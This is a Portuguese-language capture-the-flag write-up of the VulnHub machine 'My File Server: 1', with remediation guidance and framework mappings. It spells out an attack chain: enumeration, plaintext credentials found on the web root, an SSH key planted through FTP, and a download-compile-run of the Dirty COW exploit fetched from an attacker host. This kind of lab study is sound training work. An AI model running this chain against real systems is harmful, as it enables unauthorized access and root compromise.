# My File Server: 1 — Quando o FTP Anônimo Encontra uma Dirty COW

Bora rapaziada!! Quem diria que um CTF chamado "Servidor de Arquivos" ia nos presentear com credenciais em texto puro num arquivo acessível pela web e ainda deixar a gente injetar chaves SSH via FTP anônimo com escrita? E quando você acha que acabou, aparece um kernel velhão esperando um encontro com a Dirty COW. Esta máquina é uma aula magistral sobre por que a defesa em profundidade importa: cada camada foi mal configurada de forma independente e juntas formam uma kill chain perfeita. Sério mano, é um dos cenários mais realistas de "enterprise deu tudo errado" que você vai encontrar no VulnHub, sem exagero.

Grande respeito ao criador por construir uma máquina que ensina abuso de FTP, exposição de credenciais, injeção de chave SSH e exploração de kernel em um único box. Fr fr.

---

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | My File Server: 1 |
| **VM Atacante** | Kali Linux 2023.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/my-file-server-1,432/ |
| **Técnicas** | Nmap, enumeração SMB (smbmap), escaneamento web Nikto, injeção de chave SSH via FTP anônimo, exploit de kernel Dirty COW (CVE-2016-5195) |
| **CVEs** | CVE-2016-5195 (Dirty COW: escalação de privilégios no kernel Linux), CWE-522 (Credenciais insuficientemente protegidas), CWE-284 (Controle de acesso impróprio: escrita FTP anônima) |
| **Grupos APT** | APT41: exploração documentada de serviços de compartilhamento de arquivos mal configurados (FTP, SMB) para acesso inicial; FIN7: uso documentado de arquivos de credenciais expostos e compartilhamentos de rede graváveis para movimento lateral e persistência |

---

## Resumo do Ataque

```
netdiscover / nmap
    |
    v
nmap: FTP 21 (escrita anônima) + HTTP 80 + SMB 139/445 + SSH 22
    |
    v
smbmap: revela usuário 'smbuser'
    |
    v
nikto: encontra readme.txt na raiz web -> smbuser:rootroot1 (texto puro)
    |
    v
login FTP como smbuser -> diretório home gravável
    |
    v
ssh-keygen -> upload de authorized_keys via FTP -> login SSH como smbuser
    |
    v
uname -a -> kernel desatualizado -> CVE-2016-5195 (Dirty COW)
    |
    v
wget exploit 40616.c -> compilar com gcc -> ./raj
    |
    v
uid=0(root) gid=0(root) -> cat /root/proof.txt
```

---

## Metodologia

1. Descoberta de host e varredura completa de portas para identificar todos os serviços expostos
2. Enumeração SMB para coletar nomes de usuários válidos
3. Enumeração web para localizar credenciais em texto puro no readme.txt
4. Acesso de escrita FTP anônimo para injetar chave pública SSH no diretório home do smbuser
5. Login SSH usando o par de chaves injetado
6. Fingerprinting da versão do kernel e exploração com Dirty COW para root

---

## Passo 1 — Descoberta de Host

```bash
netdiscover -r 192.168.29.0/24
```

Descoberta de host baseada em ARP para identificar o alvo no segmento local. Anote o IP.

```bash
export TARGET=192.168.29.123
```

**MITRE ATT&CK:** T1595.001 — Varredura Ativa: Scanning de Blocos de IP

---

## Passo 2 — Enumeração de Portas e Serviços

```bash
nmap -p- -A $TARGET
```

**Portas abertas:**

| Porta | Serviço | Observações |
|---|---|---|
| 21 | FTP (vsftpd) | Login anônimo habilitado |
| 22 | SSH | OpenSSH |
| 80 | HTTP | Apache |
| 139/445 | SMB | Samba |

FTP com login anônimo em um servidor que também roda SSH e SMB é um alerta vermelho enorme: sugere configuração feita por alguém que "só fez funcionar" sem pensar no que cada serviço expõe.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 3 — Enumeração SMB

```bash
smbmap -H $TARGET
```

A saída revela o nome de usuário: `smbuser`. Enumeração SMB sem credenciais (sessão nula) frequentemente expõe nomes de usuário, nomes de compartilhamentos e às vezes listagens de arquivos.

```bash
smbclient -L \\\\$TARGET\\ -N
enum4linux -a $TARGET
```

**Nota real:** Enumeração SMB por sessão nula foi um vetor de ataque crítico na era Windows 2000/XP. O APT41 usou enumeração SMB como etapa inicial de reconhecimento em múltiplas campanhas contra organizações de saúde e tecnologia.

**MITRE ATT&CK:** T1021.002 — Serviços Remotos: SMB/Compartilhamentos Admin Windows

---

## Passo 4 — Enumeração Web e Descoberta de Credenciais

```bash
nikto -h http://$TARGET
```

O Nikto sinaliza um `readme.txt` acessível na raiz web. Leia tudo que o Nikto reportar, mesmo os itens "informativos".

```bash
curl http://$TARGET/readme.txt
```

Saída:

```
smbuser:rootroot1
```

Credenciais em texto puro em um arquivo acessível pela web. Isso é CWE-522 na forma mais pura. O nome de usuário descoberto via smbmap bate com a credencial aqui: os passos de enumeração estão se conectando.

**Enumeração alternativa:**

```bash
gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,bak,conf
```

**Nota real:** Arquivos de credenciais expostos em raízes web são uma descoberta consistente em pentests reais. O Alerta CISA AA22-074A documentou múltiplos atores varrendo ativamente por `.env`, `readme.txt`, `config.php.bak` e similares como vetores de acesso inicial.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais Não Protegidas: Credenciais em Arquivos

---

## Passo 5 — Injeção de Chave SSH via FTP

Login SSH direto com senha expira por configuração do servidor (provavelmente `PasswordAuthentication no` no sshd_config). Porém, o FTP tem escrita no diretório home do usuário. Esse é o bypass.

**Gerar par de chaves SSH no atacante:**

```bash
ssh-keygen -t rsa -b 4096 -f /root/.ssh/myfileserver_rsa -N ""
```

**Login via FTP e upload da chave pública:**

```bash
ftp $TARGET
# Usuário: smbuser
# Senha: rootroot1
ftp> mkdir /home/smbuser/.ssh
ftp> cd /home/smbuser/.ssh
ftp> put /root/.ssh/myfileserver_rsa.pub authorized_keys
ftp> bye
```

**Conectar via SSH usando a chave privada:**

```bash
ssh -i /root/.ssh/myfileserver_rsa smbuser@$TARGET
```

Você está logado como `smbuser`. O acesso de escrita FTP virou SSH sem nunca precisar da senha SSH, porque `authorized_keys` é o bypass. Caramba, que elegante.

**MITRE ATT&CK:** T1098.004 — Manipulação de Conta: Chaves SSH Autorizadas; T1021.004 — Serviços Remotos: SSH

---

## Passo 6 — Escalação de Privilégios via Dirty COW (CVE-2016-5195)

```bash
uname -a
```

Se o kernel for mais antigo que 4.8.3, provavelmente está vulnerável à Dirty COW. O exploit abusa de uma race condition no mecanismo copy-on-write do kernel Linux para escrever em mapeamentos de memória somente leitura, possibilitando escalação de privilégios.

```bash
# No atacante: servir o exploit
python3 -m http.server 8000

# No alvo:
wget http://192.168.29.208:8000/40616.c -O /tmp/40616.c
cd /tmp
gcc 40616.c -o raj -pthread
./raj
```

O exploit sobrescreve `/etc/passwd` para adicionar uma entrada de nível root e então abre um shell root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/proof.txt
```

(☞ﾟヮﾟ)☞ Root. A Dirty COW não falha, véi.

**Nota real:** CVE-2016-5195 está no catálogo CISA Known Exploited Vulnerabilities. Foi ativamente explorada pelo APT32 (OceanLotus) contra alvos Linux na Ásia-Pacífico em 2017-2018.

**MITRE ATT&CK:** T1068 — Exploração para Escalação de Privilégios

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|---|---|---|---|
| Credencial (texto puro) | `smbuser:rootroot1` | `/readme.txt` raiz web | Login FTP + injeção de chave SSH |
| Nome de usuário | `smbuser` | smbmap sessão nula | Confirmado via readme.txt |
| Flag root | `proof.txt` | `/root/proof.txt` | Dirty COW CVE-2016-5195 |

---

## Lições Aprendidas

| # | Descoberta | Relevância Real | Principal Aprendizado |
|---|---|---|---|
| 1 | FTP anônimo com escrita no diretório home do usuário | Milhares de servidores FTP de produção ainda permitem escrita anônima; possibilita injeção de chaves sem senha SSH | Desabilitar FTP anônimo; usar SFTP com autenticação por chave; restringir FTP a chroot somente leitura |
| 2 | Credenciais em arquivo de texto acessível pela web (readme.txt) | Arquivos de credenciais expostos são ativamente varridos por atores de ameaça conforme CISA AA22-074A | Auditar raiz web para arquivos sensíveis; nunca armazenar credenciais em caminhos acessíveis pela web |
| 3 | Sessão nula SMB expondo nomes de usuários válidos | Coleta de nomes de usuário via sessão nula é descoberta consistente em ambientes Linux/Samba corporativos | Desabilitar sessões nulas SMB; configurar Samba com `restrict anonymous = 2` |
| 4 | CVE-2016-5195 (Dirty COW): kernel sem patch | Exploração ativa por APT32 e operadores de ransomware; no catálogo CISA KEV | Manter cadência de patches do kernel; automatizar atualizações de segurança |
| 5 | Autenticação SSH somente por chave sem restrição de escrita FTP | Bypass de defesa quando controles individuais não são coordenados | Defesa em profundidade: nenhuma suposição de controle único; restringir escrita FTP e chaves SSH juntos |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Varredura Ativa: Scanning de Blocos de IP | T1595.001 |
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais Não Protegidas: Credenciais em Arquivos | T1552.001 |
| Descoberta | Descoberta | Descoberta de Conta: Conta Local | T1087.001 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SMB | T1021.002 |
| Persistência | Persistência | Manipulação de Conta: Chaves SSH Autorizadas | T1098.004 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |
| Execução | Execução | Interpretador de Comandos: Shell Unix | T1059.004 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desabilitar escrita FTP anônima:** configure vsftpd com `anonymous_enable=NO`; se leitura anônima for necessária, restringir a chroot separado sem permissões de escrita
2. **Remover credenciais de arquivos acessíveis pela web:** auditar toda a raiz web por arquivos `.txt`, `.bak`, `.conf`, `.sql`; implementar varredura automatizada em CI/CD
3. **Restringir permissões de diretório FTP:** garantir que diretórios home FTP não sejam graváveis por todos; definir `local_umask=022` no vsftpd.conf
4. **Aplicar patch do kernel:** atualizar para kernel 4.8.3 ou posterior; aplicar todos os patches de segurança disponíveis da distribuição
5. **Desabilitar sessões nulas SMB:** configurar Samba com `restrict anonymous = 2`

### Contramedidas MITRE D3FEND

- **D3-ACH**: Hardening de Configuração de Aplicação (desabilitar escrita FTP anônima)
- **D3-OAM**: Gerenciamento Administrativo do Sistema Operacional (gerenciamento de patches do kernel)
- **D3-HBPI**: Hardening de Integridade do Pipeline de Build (sem credenciais em artefatos da raiz web)
- **D3-NTF**: Filtragem de Tráfego de Rede (firewall FTP para hosts autorizados apenas)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os serviços FTP e SMB; documentar controles de acesso de escrita |
| Proteger | Controle de Acesso | Desabilitar escrita FTP anônima; exigir autenticação para todos os compartilhamentos de arquivos |
| Proteger | Segurança de Dados | Remover arquivos de credenciais de caminhos acessíveis pela web; aplicar menor privilégio na raiz web |
| Detectar | Anomalias e Eventos | Alertar sobre eventos de escrita FTP anônima; monitorar adições de chaves SSH |
| Responder | Planejamento de Resposta | Rotacionar credenciais na descoberta; revogar chaves SSH não autorizadas |
| Recuperar | Planejamento de Recuperação | Reconstruir a partir de imagem conhecida e boa; auditar todas as contas e chaves |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restringir escrita FTP; exigir autenticação SMB |
| AC-6 | Menor Privilégio | FTP anônimo somente leitura no máximo; nunca escrita |
| CM-6 | Configurações | Desabilitar escrita FTP anônima no vsftpd.conf |
| CM-7 | Funcionalidade Mínima | Desabilitar FTP se SFTP estiver disponível |
| RA-5 | Varredura de Vulnerabilidades | Varredura regular de CVEs do kernel; automatizar patches |
| SC-28 | Proteção de Informações em Repouso | Sem credenciais em arquivos acessíveis pela web |

### CISA KEV

CVE-2016-5195 (Dirty COW) está catalogada no banco de dados de Vulnerabilidades Exploradas Conhecidas da CISA. Organizações são obrigadas a corrigir esta vulnerabilidade sob a CISA BOD 22-01 para agências federais, e o aviso é recomendado para todas as organizações. Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |

---

## Considerações Finais

My File Server: 1 é enganosamente simples, mas ensina algo importante: você não precisa de um zero-day sofisticado para comprometer uma máquina. FTP anônimo com escrita mais credenciais expostas mais kernel sem patch é uma cadeia que existe em ambientes de produção reais agora mesmo. Cada passo nesta máquina se mapeia diretamente para os playbooks de atacantes do mundo real.

O nome "My File Server" é quase explícito demais: esse é exatamente o tipo de servidor que algum sysadmin configurou em 2016, esqueceu, e nunca aplicou patch. Se você encontrar algo assim em um engajamento de pentest, não é um caso raro. É um estudo de caso sobre por que gerenciamento de patches e higiene de configuração importam juntos.

Continuem estudando, mano. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
